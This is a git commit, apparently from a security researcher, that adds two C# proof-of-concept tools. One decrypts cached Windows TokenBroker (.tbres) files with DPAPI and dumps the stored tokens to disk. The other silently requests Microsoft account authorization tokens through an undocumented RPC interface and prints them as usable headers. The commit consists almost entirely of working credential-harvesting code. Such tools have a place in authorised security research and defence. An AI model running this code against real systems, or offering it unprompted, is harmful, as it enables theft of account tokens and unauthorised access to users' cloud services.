471f1a767579d3e546dccd6611d02aa7fb67abf6
Adam Chester <xpnsec@protonmail.com>
2022-10-17 00:29:06 +0100

    Initial commit

---
+++ TBRES/TBRES/Program.cs
@@ -0,0 +1,59 @@
+﻿using System;
+using System.IO;
+using System.Text;
+using System.Security.Cryptography;
+using System.Text.Json;
+using System.Text.Json.Nodes;
+using System.Buffers.Text;
+using System.Runtime.InteropServices;
+
+namespace TBRES
+{
+    public class main
+    {
+        public static string[] GetFiles(string dir)
+        {
+            var tbresFiles = Directory.EnumerateFiles(dir, "*.tbres");
+            return tbresFiles.ToArray();
+        }
+
+        public static void OutputDecryptedData(string origFile, string input)
+        {
+            try
+            {
+                var jsonObject = JsonNode.Parse(input).AsObject();
+                var encodedData = jsonObject["TBDataStoreObject"]["ObjectData"]["SystemDefinedProperties"]["ResponseBytes"]["Value"].ToString();
+                var encryptedData = Convert.FromBase64String(encodedData);
+                var decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
+                File.WriteAllBytes(Path.GetFileName(origFile) + ".decrypted", decryptedData);
+
+            } catch (System.Exception) {
+                Console.WriteLine("[!] Error Decrypting File: {0}", origFile);
+                return;
+            }
+
+            Console.WriteLine("[*] TBRES Decrypted: {0}.decrypted", Path.GetFileName(origFile));
+
+        }
+
+        public static string DecryptFiles(string dir)
+        {
+            foreach (var file in GetFiles(dir))
+            {
+                var fileJSON = File.ReadAllText(file, Encoding.Unicode);
+                fileJSON = fileJSON.Substring(0, fileJSON.Length - 1);
+                OutputDecryptedData(file, fileJSON);
+            }
+
+            return "";
+        }
+
+        public static void Main(string[] args)
+        {
+            Console.WriteLine("TBRES Decryptor by @_xpn_");
+
+            var path = String.Format(@"{0}\Microsoft\TokenBroker\Cache", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
+            main.DecryptFiles(path);
+        }
+    }
+}
---
+++ WLIDTokenRetriever/WLIDTokenRetriever/Program.cs
@@ -0,0 +1,53 @@
+﻿using NtApiDotNet.Ndr.Marshal;
+//using rpc_cc105610_da03_467e_bc73_5b9e2937458d_1_0_Win101809;
+using rpc_cc105610_da03_467e_bc73_5b9e2937458d_1_0_Win1122H2;
+using System;
+
+namespace LaunchUACAdmin
+{
+    class Program
+    {
+        static void GetToken(string email, string clientID)
+        {
+            using (Client client = new Client())
+            {
+                Struct_5[] s5 = new Struct_5[1];
+                int arg1, arg2, arg3, arg4, arg6;
+
+                Struct_4[] s4 = new Struct_4[] {
+                    new Struct_4(
+                        // Change to gen tokens for other services
+                        "scope=service::substrate.office.com::MBI_SSL_SHORT&telemetry=MATS&uaid=ABCDEF12-3456-7890-AAAA-DEADB33F0000&clientid=00000000480728C5",
+                        "TOKEN_BROKER",
+                        "",
+                        0,
+                        0,
+                        0, // Remove this if targeting Win10
+                        1
+                        ) };
+
+                client.Connect();
+                NdrContextHandle context;
+
+                client.WLIDCreateContext(email, clientID, 0x880000, out context);
+                client.WLIDAcquireTokensWithNGC(context, 0x200, 1, s4, "", 0, "Silent", out arg1, out arg2, out arg3, out arg4, out s5, out arg6);
+
+                Console.WriteLine("[*] Retrieved Token:");
+                Console.WriteLine("X-AnchorMailbox: CID:{0}", s5[0].Member18);
+                Console.WriteLine("Authorization: Passport1.4 from-PP='{0}'", s5[0].Member28);
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            if (args.Length == 0)
+            {
+                Console.WriteLine("email address argument required");
+                return;
+            }
+
+            Console.WriteLine("WLID Token Retriever POC by @_xpn_\n");
+            GetToken(args[0], "00000000480728C5");
+        }
+    }
+}
